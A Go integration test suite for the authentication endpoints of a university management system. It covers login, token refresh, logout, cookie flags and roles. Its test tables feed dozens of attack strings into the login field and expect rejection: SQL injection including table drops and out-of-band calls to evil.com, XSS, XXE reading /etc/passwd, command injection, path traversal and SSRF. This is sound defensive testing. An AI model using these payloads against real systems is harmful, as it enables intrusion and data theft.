package auth

import (
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"

	authapp "github.com/ARUMANDESU/ucms/internal/application/auth"
	"github.com/ARUMANDESU/ucms/internal/domain/user"
	"github.com/ARUMANDESU/ucms/internal/domain/valueobject/role"
	authhttp "github.com/ARUMANDESU/ucms/internal/ports/http/auth"
	"github.com/ARUMANDESU/ucms/tests/integration/builders"
	"github.com/ARUMANDESU/ucms/tests/integration/fixtures"
	"github.com/ARUMANDESU/ucms/tests/integration/framework"
	httpframework "github.com/ARUMANDESU/ucms/tests/integration/framework/http"
)

type AuthIntegrationSuite struct {
	framework.IntegrationTestSuite
}

func TestAuthIntegrationSuite(t *testing.T) {
	suite.Run(t, new(AuthIntegrationSuite))
}

func (s *AuthIntegrationSuite) TestAuth_Login() {
	studentEmail := fixtures.TestStudent.Email
	studentBarcode := fixtures.TestStudent.Barcode
	studentPassword := fixtures.TestStudent.Password
	u := builders.NewUserBuilder().
		WithEmail(studentEmail).
		WithBarcode(studentBarcode).
		WithPassword(studentPassword).
		Build()
	s.DB.SeedUser(s.T(), u)
	aitusaStudentEmail := fixtures.TestStudent2.Email
	aitusaStudentBarcode := fixtures.TestStudent2.Barcode
	aitusaStudentPassword := fixtures.TestStudent2.Password
	aitusaStudent := builders.NewUserBuilder().
		WithEmail(aitusaStudentEmail).
		WithBarcode(aitusaStudentBarcode).
		WithPassword(aitusaStudentPassword).
		WithRole(role.AITUSA).
		Build()
	s.DB.SeedUser(s.T(), aitusaStudent)

	staffEmail := fixtures.TestStaff.Email
	staffBarcode := fixtures.TestStaff.Barcode
	staffPassword := fixtures.TestStaff.Password
	staff := builders.NewUserBuilder().
		WithEmail(staffEmail).
		WithBarcode(staffBarcode).
		WithPassword(staffPassword).
		WithRole(role.Staff).
		Build()
	s.DB.SeedUser(s.T(), staff)

	testCases := []struct {
		name         string
		loginField   string
		password     string
		expectedUID  string
		expectedRole string
	}{
		{
			name:         "login with student email",
			loginField:   u.Email(),
			password:     studentPassword,
			expectedUID:  u.Barcode().String(),
			expectedRole: u.Role().String(),
		},
		{
			name:         "login with student barcode",
			loginField:   u.Barcode().String(),
			password:     studentPassword,
			expectedUID:  u.Barcode().String(),
			expectedRole: u.Role().String(),
		},
		{
			name:         "login with aitusa student email",
			loginField:   aitusaStudent.Email(),
			password:     aitusaStudentPassword,
			expectedUID:  aitusaStudent.Barcode().String(),
			expectedRole: aitusaStudent.Role().String(),
		},
		{
			name:         "login with aitusa student barcode",
			loginField:   aitusaStudent.Barcode().String(),
			password:     aitusaStudentPassword,
			expectedUID:  aitusaStudent.Barcode().String(),
			expectedRole: aitusaStudent.Role().String(),
		},
		{
			name:         "login with staff email",
			loginField:   staff.Email(),
			password:     staffPassword,
			expectedUID:  staff.Barcode().String(),
			expectedRole: staff.Role().String(),
		},
		{
			name:         "login with staff barcode",
			loginField:   staff.Barcode().String(),
			password:     staffPassword,
			expectedUID:  staff.Barcode().String(),
			expectedRole: staff.Role().String(),
		},
	}

	for _, tt := range testCases {
		s.T().Run(tt.name, func(t *testing.T) {
			resp := s.HTTP.Login(t, tt.loginField, tt.password)

			resp.AssertSuccess()

			s.assertValidAccessToken(t, resp, tt.expectedUID, tt.expectedRole)
			s.assertValidRefreshToken(t, resp, tt.expectedUID)
		})
	}
}

func (s *AuthIntegrationSuite) TestAuth_Login_InvalidCredentials() {
	invalidEmail := fixtures.TestStudent2.Email
	invalidBarcode := fixtures.TestStudent2.Barcode
	invalidPassword := fixtures.TestStudent2.Password
	studentEmail := fixtures.TestStudent.Email
	studentBarcode := fixtures.TestStudent.Barcode
	studentPassword := fixtures.TestStudent.Password
	u := builders.NewUserBuilder().
		WithEmail(studentEmail).
		WithBarcode(studentBarcode).
		WithPassword(studentPassword).
		Build()
	s.DB.SeedUser(s.T(), u)

	tests := []struct {
		name            string
		loginField      string
		password        string
		expectedStatus  int
		expectedMessage string
	}{
		{
			name:            "invalid email",
			loginField:      invalidEmail,
			password:        studentPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "invalid barcode",
			loginField:      invalidBarcode,
			password:        studentPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "empty email_barcode",
			loginField:      "",
			password:        studentPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "invalid password with email",
			loginField:      studentEmail,
			password:        invalidPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "invalid password with barcode",
			loginField:      studentBarcode,
			password:        invalidPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "invalid email with invalid password",
			loginField:      invalidEmail,
			password:        invalidPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "invalid barcode with invalid password",
			loginField:      invalidBarcode,
			password:        invalidPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "empty password with email",
			loginField:      studentEmail,
			password:        "",
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Password cannot be blank",
		},
		{
			name:            "empty password with barcode",
			loginField:      studentBarcode,
			password:        "",
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Password cannot be blank",
		},
		{
			name:            "inject through email and barcode detection",
			loginField:      "BACODE@.inject",
			password:        studentPassword,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
	}

	for _, tt := range tests {
		s.T().Run(tt.name, func(t *testing.T) {
			s.HTTP.Login(t, tt.loginField, tt.password).
				AssertStatus(tt.expectedStatus).
				AssertContainsMessage(tt.expectedMessage)
		})
	}
}

func (s *AuthIntegrationSuite) assertValidAccessToken(t *testing.T, resp *httpframework.Response, expectedUID, expectedRole string) {
	accessCookie := resp.GetCookie(authhttp.AccessJWTCookie)

	require.Equal(t, "ucmsv2_access", accessCookie.Name)
	require.Equal(t, "/", accessCookie.Path)
	require.Equal(t, "localhost", accessCookie.Domain)
	require.True(t, accessCookie.HttpOnly)
	require.True(t, accessCookie.Secure)
	require.Equal(t, http.SameSiteStrictMode, accessCookie.SameSite)
	require.Greater(t, accessCookie.MaxAge, 0)

	authapp.NewJWTTokenAssertion(t, accessCookie.Value, []byte(fixtures.AccessTokenSecretKey)).
		AssertValid().
		AssertUID(expectedUID).
		AssertUserRole(expectedRole).
		AssertISS("ucmsv2_auth").
		AssertSub("user")
}

func (s *AuthIntegrationSuite) assertValidRefreshToken(t *testing.T, resp *httpframework.Response, expectedUID string) {
	refreshCookie := resp.GetCookie(authhttp.RefreshJWTCookie)

	require.Equal(t, "ucmsv2_refresh", refreshCookie.Name)
	require.Equal(t, "/v1/auth/refresh", refreshCookie.Path)
	require.Equal(t, "localhost", refreshCookie.Domain)
	require.True(t, refreshCookie.HttpOnly)
	require.True(t, refreshCookie.Secure)
	require.Equal(t, http.SameSiteStrictMode, refreshCookie.SameSite)
	require.Greater(t, refreshCookie.MaxAge, 0)

	authapp.NewJWTTokenAssertion(t, refreshCookie.Value, []byte(fixtures.RefreshTokenSecretKey)).
		AssertValid().
		AssertUID(expectedUID).
		AssertISS("ucmsv2_auth").
		AssertSub("refresh").
		AssertJTINotEmpty().
		AssertScope("refresh")
}

func (s *AuthIntegrationSuite) TestAuth_Refresh() {
	// Setup user
	user := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		Build()
	s.DB.SeedUser(s.T(), user)

	s.T().Run("successful refresh with valid token", func(t *testing.T) {
		// First login to get refresh token
		loginResp := s.HTTP.Login(t, user.Email(), fixtures.TestStudent.Password)
		loginResp.AssertSuccess()

		refreshCookie := loginResp.GetCookie(authhttp.RefreshJWTCookie)
		require.NotNil(t, refreshCookie)

		// Use refresh token to get new access token
		refreshResp := s.HTTP.Refresh(t, refreshCookie.Value)
		refreshResp.AssertSuccess()

		// Verify new access token
		s.assertValidAccessToken(t, refreshResp, user.Barcode().String(), user.Role().String())
	})

	s.T().Run("successful refresh when user role changes", func(t *testing.T) {
		loginResp := s.HTTP.Login(t, user.Email(), fixtures.TestStudent.Password)
		loginResp.AssertSuccess()

		refreshCookie := loginResp.GetCookie(authhttp.RefreshJWTCookie)
		require.NotNil(t, refreshCookie)

		changedUser := builders.NewUserBuilder().
			WithEmail(user.Email()).
			WithBarcode(user.Barcode().String()).
			WithPassword(fixtures.TestStudent.Password).
			WithRole(role.Staff).
			Build()
		s.DB.SeedUser(s.T(), changedUser)

		refreshResp := s.HTTP.Refresh(t, refreshCookie.Value)
		refreshResp.AssertSuccess()

		s.assertValidAccessToken(t, refreshResp, changedUser.Barcode().String(), changedUser.Role().String())
	})
	s.T().Run("invalid refresh token", func(t *testing.T) {
		s.HTTP.Refresh(t, "invalid-token").
			AssertStatus(http.StatusUnauthorized).
			AssertContainsMessage("Invalid Credentials")
	})

	s.T().Run("missing refresh token", func(t *testing.T) {
		s.HTTP.Refresh(t, "").
			AssertStatus(http.StatusUnauthorized).
			AssertContainsMessage("Invalid Credentials")
	})

	s.T().Run("expired refresh token", func(t *testing.T) {
		// Create expired token
		expiredToken := builders.JWTFactory{}.
			RefreshTokenBuilder(user.Barcode().String()).
			WithExpiration(time.Now().Add(-time.Hour)).
			BuildSignedStringT(t)

		s.HTTP.Refresh(t, expiredToken).
			AssertStatus(http.StatusUnauthorized).
			AssertContainsMessage("Invalid Credentials")
	})
}

func (s *AuthIntegrationSuite) TestAuth_Logout() {
	// Setup user
	user := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		Build()
	s.DB.SeedUser(s.T(), user)

	s.T().Run("successful logout", func(t *testing.T) {
		// Login first
		loginResp := s.HTTP.Login(t, user.Email(), fixtures.TestStudent.Password)
		loginResp.AssertSuccess()

		accessCookie := loginResp.GetCookie(authhttp.AccessJWTCookie)
		refreshCookie := loginResp.GetCookie(authhttp.RefreshJWTCookie)

		// Logout
		logoutResp := s.HTTP.Logout(t, accessCookie.Value, refreshCookie.Value)
		logoutResp.AssertSuccess()

		// Verify cookies are cleared
		logoutAccessCookie := logoutResp.GetCookie(authhttp.AccessJWTCookie)
		logoutRefreshCookie := logoutResp.GetCookie(authhttp.RefreshJWTCookie)

		require.Equal(t, "", logoutAccessCookie.Value)
		require.Equal(t, "", logoutRefreshCookie.Value)
		require.Equal(t, -1, logoutAccessCookie.MaxAge)
		require.Equal(t, -1, logoutRefreshCookie.MaxAge)
	})

	s.T().Run("logout without tokens", func(t *testing.T) {
		s.HTTP.Logout(t, "", "").
			AssertStatus(http.StatusUnauthorized)
	})
}

func (s *AuthIntegrationSuite) TestAuth_TokenSecurity() {
	// Setup two different users
	user1 := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		Build()
	user2 := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent2.Email).
		WithBarcode(fixtures.TestStudent2.Barcode).
		WithPassword(fixtures.TestStudent2.Password).
		Build()

	s.DB.SeedUser(s.T(), user1)
	s.DB.SeedUser(s.T(), user2)

	s.T().Run("token signature verification", func(t *testing.T) {
		// Create token with wrong signature
		tamperedToken := builders.JWTFactory{}.
			AccessTokenBuilder(user1.Barcode().String(), user1.Role().String()).
			WithSecret([]byte("wrong-secret")).
			BuildSignedStringT(t)

		s.HTTP.Refresh(t, tamperedToken).
			AssertStatus(http.StatusUnauthorized)
	})

	s.T().Run("cross-user token usage", func(t *testing.T) {
		// Login as user1
		loginResp := s.HTTP.Login(t, user1.Email(), fixtures.TestStudent.Password)
		loginResp.AssertSuccess()

		user1Token := loginResp.GetCookie(authhttp.AccessJWTCookie)

		// Try to use user1's token to access user2's data (if implemented)
		// This would be tested in protected endpoints, not auth endpoints directly
		require.NotNil(t, user1Token)
		require.Equal(t, user1.Barcode().String(), user1.Barcode().String())
	})

	s.T().Run("malformed token claims", func(t *testing.T) {
		// Create token with missing required claims
		malformedToken := builders.JWTFactory{}.
			RefreshTokenBuilder(user1.Barcode().String()).
			WithEmptyClaims().
			WithClaim("invalid", "claim").
			BuildSignedStringT(t)

		s.HTTP.Refresh(t, malformedToken).
			AssertStatus(http.StatusUnauthorized)
	})
}

func (s *AuthIntegrationSuite) TestAuth_EdgeCases() {
	user := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		Build()
	s.DB.SeedUser(s.T(), user)

	testCases := []struct {
		name            string
		loginField      string
		password        string
		expectedStatus  int
		expectedMessage string
	}{
		{
			name:            "very long email",
			loginField:      "a" + strings.Repeat("very-long-email", 50) + "@example.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "sql injection in email",
			loginField:      "admin@example.com'; DROP TABLE users; --",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "sql injection in valid email",
			loginField:      fmt.Sprintf("%s'; DROP TABLE users; --", user.Email()),
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "xss attempt in login field",
			loginField:      "<script>alert('xss')</script>@example.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "unicode characters",
			loginField:      "tëst@ëxämplë.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "case sensitivity test",
			loginField:      strings.ToUpper(user.Email()),
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:           "whitespace in credentials", // Successful login with whitespace because http port sanitisizes and normalizes input
			loginField:     " " + user.Email() + " ",
			password:       fixtures.TestStudent.Password,
			expectedStatus: http.StatusOK,
		},
	}

	for _, tc := range testCases {
		s.T().Run(tc.name, func(t *testing.T) {
			s.HTTP.Login(t, tc.loginField, tc.password).
				AssertStatus(tc.expectedStatus).
				AssertContainsMessage(tc.expectedMessage)
		})
	}
}

func (s *AuthIntegrationSuite) TestAuth_ContentTypeAndHeaders() {
	user := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		Build()
	s.DB.SeedUser(s.T(), user)

	s.T().Run("missing content-type header", func(t *testing.T) {
		resp := s.HTTP.Do(t, httpframework.NewRequest("POST", "/v1/auth/login").
			WithJSON(map[string]string{
				"email_barcode": user.Email(),
				"password":      fixtures.TestStudent.Password,
			}).
			WithHeader("Content-Type", "").
			Build())

		resp.AssertStatus(http.StatusUnsupportedMediaType)
	})

	s.T().Run("wrong content-type header", func(t *testing.T) {
		resp := s.HTTP.Do(t, httpframework.NewRequest("POST", "/v1/auth/login").
			WithJSON(map[string]string{
				"email_barcode": user.Email(),
				"password":      fixtures.TestStudent.Password,
			}).
			WithHeader("Content-Type", "text/plain").
			Build())

		resp.AssertStatus(http.StatusUnsupportedMediaType)
	})

	s.T().Run("malformed json", func(t *testing.T) {
		req := httpframework.Request{
			Method: "POST",
			Path:   "/v1/auth/login",
			Headers: map[string]string{
				"Content-Type": "application/json",
			},
			Body: `{"email_barcode": "test@example.com", "password": "incomplete json"`,
		}

		s.HTTP.Do(t, req).AssertStatus(http.StatusBadRequest)
	})
}

func (s *AuthIntegrationSuite) TestAuth_RoleBasedAccess() {
	// Create users with different roles
	student := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		WithRole(role.Student).
		Build()

	staff := builders.NewUserBuilder().
		WithEmail(fixtures.TestStaff.Email).
		WithBarcode(fixtures.TestStaff.Barcode).
		WithPassword(fixtures.TestStaff.Password).
		WithRole(role.Staff).
		Build()

	aitusaStudent := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent2.Email).
		WithBarcode(fixtures.TestStudent2.Barcode).
		WithPassword(fixtures.TestStudent2.Password).
		WithRole(role.AITUSA).
		Build()

	s.DB.SeedUser(s.T(), student)
	s.DB.SeedUser(s.T(), staff)
	s.DB.SeedUser(s.T(), aitusaStudent)

	testCases := []struct {
		name         string
		user         *user.User
		password     string
		expectedRole string
	}{
		{
			name:         "student login",
			user:         student,
			password:     fixtures.TestStudent.Password,
			expectedRole: role.Student.String(),
		},
		{
			name:         "staff login",
			user:         staff,
			password:     fixtures.TestStaff.Password,
			expectedRole: role.Staff.String(),
		},
		{
			name:         "aitusa student login",
			user:         aitusaStudent,
			password:     fixtures.TestStudent2.Password,
			expectedRole: role.AITUSA.String(),
		},
	}

	for _, tc := range testCases {
		s.T().Run(tc.name, func(t *testing.T) {
			resp := s.HTTP.Login(t, tc.user.Email(), tc.password)
			resp.AssertSuccess()

			s.assertValidAccessToken(t, resp, tc.user.Barcode().String(), tc.expectedRole)
			s.assertValidRefreshToken(t, resp, tc.user.Barcode().String())
		})
	}
}

func (s *AuthIntegrationSuite) TestAuth_AdvancedInjectionVectors() {
	// Setup a valid user for certain tests
	validUser := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		Build()
	s.DB.SeedUser(s.T(), validUser)

	testCases := []struct {
		name            string
		loginField      string
		password        string
		expectedStatus  int
		expectedMessage string
		description     string
	}{
		// Advanced SQL Injection Patterns
		{
			name:            "Boolean-based Blind SQL Injection",
			loginField:      "admin' AND '1'='1",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Boolean blind SQL injection",
		},
		{
			name:            "Time-based Blind SQL Injection MySQL",
			loginField:      "admin' AND SLEEP(5)--",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "MySQL time-based injection",
		},
		{
			name:            "Error-based SQL Injection",
			loginField:      "' AND 1=CONVERT(int, @@version)--",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Error-based SQL injection",
		},
		{
			name:            "Out-of-band SQL Injection",
			loginField:      "admin' UNION SELECT LOAD_FILE('\\\\\\\\evil.com\\\\share')--",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Out-of-band data exfiltration",
		},
		{
			name:            "SQL Injection with Hex Encoding",
			loginField:      "0x61646d696e",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Hex encoded SQL injection",
		},
		{
			name:            "SQL Injection with Comments",
			loginField:      "admin'/*comment*/OR/*comment*/'1'='1",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "SQL injection with inline comments",
		},

		// NoSQL Injection Variants
		{
			name:            "MongoDB Operator Injection",
			loginField:      "{\"$gt\": \"\"}",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "MongoDB greater than operator",
		},
		{
			name:            "NoSQL Regex Injection",
			loginField:      "{\"$regex\": \".*\"}",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "NoSQL regex wildcard",
		},
		{
			name:            "NoSQL JavaScript Injection",
			loginField:      "{\"$where\": \"this.email == 'admin'\"}",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "NoSQL JavaScript code injection",
		},

		// Advanced XSS Patterns
		{
			name:            "XSS with Encoded Payload",
			loginField:      "&#60;script&#62;alert('XSS')&#60;/script&#62;",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "HTML entity encoded XSS",
		},
		{
			name:            "XSS with Mixed Case",
			loginField:      "<ScRiPt>alert('XSS')</sCrIpT>",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Case variation XSS bypass",
		},
		{
			name:            "XSS with Null Bytes",
			loginField:      "<scri\x00pt>alert('XSS')</scri\x00pt>",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Null byte XSS bypass",
		},
		{
			name:            "Mutation XSS",
			loginField:      "<noscript><p title=\"</noscript><img src onerror=alert(1)>\">",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Mutation-based XSS",
		},

		// LDAP Injection
		{
			name:            "LDAP Filter Bypass",
			loginField:      "admin)(|(password=*))",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "LDAP filter manipulation",
		},
		{
			name:            "LDAP AND/OR Injection",
			loginField:      "*)(uid=*))(|(uid=*",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "LDAP logical operator injection",
		},

		// XML/XXE Attacks
		{
			name:            "XXE with SYSTEM Entity",
			loginField:      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>&xxe;",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "XXE file disclosure",
		},
		{
			name:            "XXE with Parameter Entity",
			loginField:      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]>",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "XXE with external DTD",
		},

		// Command Injection
		{
			name:            "Command Injection with Ampersand",
			loginField:      "admin@test.com & whoami",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Command chaining with ampersand",
		},
		{
			name:            "Command Injection with Double Ampersand",
			loginField:      "admin@test.com && cat /etc/passwd",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Conditional command execution",
		},
		{
			name:            "Command Injection with Dollar Sign",
			loginField:      "$(whoami)@test.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Command substitution",
		},

		// Path Traversal
		{
			name:            "Path Traversal Windows Style",
			loginField:      "..\\..\\..\\windows\\system32\\config\\sam",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Windows path traversal",
		},
		{
			name:            "Path Traversal with Null Byte",
			loginField:      "../../../etc/passwd\x00.jpg",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Path traversal with null byte",
		},

		// Unicode and Encoding Attacks
		{
			name:            "Unicode Case Mapping Bypass",
			loginField:      "ﬀ@test.com", // Unicode ligature ff
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Unicode case mapping attack",
		},
		{
			name:            "Punycode/IDN Attack",
			loginField:      "xn--admin@test.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Punycode encoding attack",
		},
		{
			name:            "UTF-7 Encoding Attack",
			loginField:      "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "UTF-7 encoded payload",
		},

		// Header Injection
		{
			name:            "Host Header Injection",
			loginField:      "admin@evil.com\r\nHost: evil.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Host header injection",
		},
		{
			name:            "Cache Poisoning via Header",
			loginField:      "admin@test.com\r\nX-Forwarded-Host: evil.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Cache poisoning attempt",
		},

		// Format String and Buffer Overflow
		{
			name:            "Format String with Hex Values",
			loginField:      "%08x.%08x.%08x.%08x",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Format string memory disclosure",
		},
		{
			name:            "Buffer Overflow Attempt",
			loginField:      strings.Repeat("A", 10000),
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "body must not be larger than 4 KB",
			description:     "Buffer overflow with long input",
		},
		{
			name:            "Long Input Under 4KB Limit",
			loginField:      strings.Repeat("A", 500), // Under 4KB when combined with password
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Long input that passes size check but fails validation",
		},
		// JSON/Serialization Attacks
		{
			name:            "JSON Injection with Escape",
			loginField:      "admin\",\"isAdmin\":true,\"email\":\"hacker@test.com",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "JSON structure manipulation",
		},
		{
			name:            "PHP Object Injection Pattern",
			loginField:      "O:8:\"stdClass\":1:{s:5:\"admin\";b:1;}",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "PHP serialization payload",
		},

		// Polyglot Payloads
		{
			name:            "Multi-context Polyglot",
			loginField:      "'\"--></script></title></textarea></noscript></style></xmp>>[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47;*'/**/eval(name)/*'%2A//;alert(1);",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Polyglot payload for multiple contexts",
		},

		// Business Logic Attacks
		{
			name:            "Type Confusion Attack",
			loginField:      "true",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Boolean type confusion",
		},
		{
			name:            "Integer Overflow Pattern",
			loginField:      "99999999999999999999999999999999",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Integer overflow attempt",
		},
		{
			name:            "Scientific Notation Injection",
			loginField:      "1e308",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Scientific notation edge case",
		},
		{
			name:            "Negative Zero",
			loginField:      "-0",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Negative zero edge case",
		},

		// GraphQL Injection
		{
			name:            "GraphQL Introspection Query",
			loginField:      "{__schema{types{name}}}",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "GraphQL schema introspection",
		},

		// Race Condition Patterns
		{
			name:            "Race Condition Marker",
			loginField:      "admin@test.com%00",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Null byte for race condition",
		},

		// Server-Side Request Forgery (SSRF)
		{
			name:            "SSRF with File Protocol",
			loginField:      "file:///etc/passwd",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "SSRF file protocol",
		},
		{
			name:            "SSRF with Gopher Protocol",
			loginField:      "gopher://localhost:3306",
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "SSRF gopher protocol",
		},
		{
			name:            "Compression Bomb Pattern",
			loginField:      "a" + strings.Repeat("0", 100),
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Compression ratio attack pattern",
		},
		{
			name:            "Repeated Pattern DoS",
			loginField:      strings.Repeat("ab", 100),
			password:        fixtures.TestStudent.Password,
